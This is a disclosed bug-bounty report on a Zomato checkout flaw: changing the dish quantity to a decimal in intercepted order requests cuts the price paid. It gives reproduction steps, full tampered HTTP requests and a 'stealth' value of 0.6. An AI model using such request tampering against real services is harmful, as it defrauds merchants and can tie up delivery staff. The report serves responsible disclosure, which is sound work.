# [www.zomato.com] Tampering with Order Quantity and paying less amount then actual amount, leads to business loss

## Report Details
- **Report ID**: 403783
- **URL**: https://hackerone.com/reports/403783
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-09-01T09:51:42.131Z
- **Disclosed**: 2018-09-17T09:58:51.514Z

## Reporter
- **Username**: akhil-reni
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
**Hi, Team**,

Like discussed with Prateek I am dropping the report here. 

**Summary:** 
Like the **title** says using this vulnerability one could order food at negligible price or keep all delivery executives busy.

**Description:**
While fuzzing my way through the payment flow on Zomato orders I came across a couple of interesting bugs that can be escalated to security vulnerabilities. 

██████ **███████**
█████████

█████████**This is a Security Issue** But when we set a quantity to a decimal number, for example: let's say I am trying to order 1 Biryani that costs 99₹, I can set the quantity to 0.1 and now the order price will total to 9.9₹. 
To verify the vulnerability I did two orders:

- One, ordered at the price of 0.1 quantity - Order got cancelled.

{███████}

- Two, ordered at the price of 0.6 quantity - Order got successfull delivered.

{████}

{████}

But in both the cases delivery executives were assigned, that basically means that one could spend as low as 10 rupees and keep all zomato executives in my area busy/occupied.

**Platform(s) Affected:** Website (probably mobile too, if it's the same flow)

## Browsers Verified In [If Applicable]:

N/A

## Steps To Reproduce:

████ Select any resturant 
██████Select any food item from the menu and click continue

{██████████}

3) Intercept the HTTP requests, click select net banking
4) You'll come across the following request, change the quantity to 0.1 (to be on stealth mode, change the quantity to 0.6)

```
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 825
Cookie: <redacted>
Connection: close

████████&order%5Bdishes%5D%5B0%5D%5Btype%5D=dish&order%5Bdishes%5D%5B0%5D%5Bcomment%5D=&order%5Bdishes%5D%5B0%5D%5Bitem_id%5D=481238585&order%5Bdishes%5D%5B0%5D%5Bitem_name%5D=Veg%20Biryani%20%5BRegular%5D&order%5Bdishes%5D%5B0%5D%5Bmrp_item%5D=0&order%5Bdishes%5D%5B0%5D%5Bquantity%5D=1&order%5Bdishes%5D%5B0%5D%5Btags%5D=1&order%5Bdishes%5D%5B0%5D%5Btax_inclusive%5D=0&order%5Bdishes%5D%5B0%5D%5Bunit_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Btotal_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Bis_bogo_active%5D=false&order%5Bdishes%5D%5B0%5D%5BbogoItemsCount%5D=0&order%5Bdishes%5D%5B0%5D%5BalwaysShowOnCheckout%5D=0&order%5Bdishes%5D%5B0%5D%5Bduration_id%5D=0&res_id=███████&address_id=██████&voucher_code=&payment_method_type=&payment_method_id=0&card_bin=&case=calculatecart&csrfToken=███████
```
{██████████}

5) Click pay and you'll come across the following request. Change the quantity again to 0.1 (or whatever quantity you entered in the previous step)

```
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 2444
Cookie: <redacted>
Connection: close

case=makeonlineorder&res_id=█████████&order={"charges":[{"item_name":"Delivery Charge","total_cost":10,"type":"charge","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":96623,"display_cost":"â¹10"}],"taxes":[{"item_name":"Taxes","total_cost":0.6,"type":"tax","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹0.60"}],"subtotal2":[{"item_name":"Subtotal","total_cost":12,"type":"subtotal2","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹12.00"}],"total":[{"item_name":"Grand Total","total_cost":"22.60","type":"total","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹22.60"}],"dishes":[{"type":"dish","comment":"","groups":[],"item_id":481238585,"item_name":"Veg Biryani [Regular]","mrp_item":0,"quantity":0.1,"tags":"1","tax_inclusive":0,"unit_cost":120,"total_cost":120,"is_bogo_active":false,"bogoItemsCount":0,"alwaysShowOnCheckout":0,"duration_id":0}]}&██████
```

{████████}

6) You'll be redirected to payment gateway, pay the amount. 
7) If the restaurant hasn't noticed the quantity then the order will be delivered successfully.


## Supporting Material/References:
Order ID - ██████ (which got delivered as POC)

## Impact

The impact is:
1 - Order food for a negligible amount
2 - Or make indefinite orders at a very low price by setting quantity to 0.02. The orders will go through, and you keep all delivery executives busy this way in one single area. This can be a business risk cause all new orders have to wait until a delivery executive is assigned to them.

PS: Setting the severity to high, you can give it a right tag once you discuss the worse case scenario internally.

## Attachments
No attachments
